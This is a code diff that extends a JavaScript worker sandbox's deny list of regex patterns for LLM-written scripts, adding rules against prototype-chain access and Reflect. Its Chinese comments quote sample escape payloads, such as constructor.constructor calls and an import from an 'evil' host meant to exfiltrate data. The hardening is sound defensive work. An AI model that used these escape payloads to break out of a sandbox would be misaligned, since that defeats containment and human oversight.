@@ -52,6 +52,7 @@ const WORKER_PREAMBLE = `(${lockSandboxGlobal.toString()})(self);`
 // 静态扫描禁用模式:动态 import() 是语法,Worker 运行时无法禁用(classic worker 支持 import() 拉外网 ES 模块),
 // 只能在入口静态拦截,防 LLM 脚本 `import("https://evil/x.js")` 外泄 transform 拿到的 data。
 // eval/Function/require 同列(动态执行可绕过静态扫描,双保险:运行时 workerCode 内 fn 创建后再禁 self.eval/self.Function)。
+// constructor/getPrototypeOf/prototype 防原型链逃逸(如 "".constructor.constructor("fetch('...')")())
 const SANDBOX_FORBIDDEN_PATTERNS: { re: RegExp; msg: string }[] = [
   { re: /\bimport\s*\(/, msg: '动态 import() 拉外网模块' },
   { re: /\bimport\s+[\w'"]/, msg: 'import 语句' },
@@ -59,6 +60,13 @@ const SANDBOX_FORBIDDEN_PATTERNS: { re: RegExp; msg: string }[] = [
   { re: /\bFunction\s*\(/, msg: 'Function() 构造' },
   { re: /new\s+Function\b/, msg: 'new Function() 构造' },
   { re: /\brequire\s*\(/, msg: 'require() 拉模块' },
+  { re: /\bconstructor\s*\(/, msg: '沙箱脚本不允许原型链访问' },
+  { re: /\bgetPrototypeOf\b/, msg: '沙箱脚本不允许原型链访问' },
+  { re: /\.prototype\b/, msg: '沙箱脚本不允许原型链访问' },
+  // rv-sec 复审:__proto__ 属性访问取 constructor 链(data.__proto__.constructor.constructor(...) 同款逃逸);
+  // Reflect 可从函数对象反查 constructor(Reflect.get(fn,'constructor'))。Symbol.for/bind 变体核实为伪风险(取不到已锁函数/误伤合法脚本),不拦。
+  { re: /__proto__/, msg: '沙箱脚本不允许原型链访问' },
+  { re: /\bReflect\b/, msg: '沙箱脚本不允许反射访问' },
 ]
 
 /**
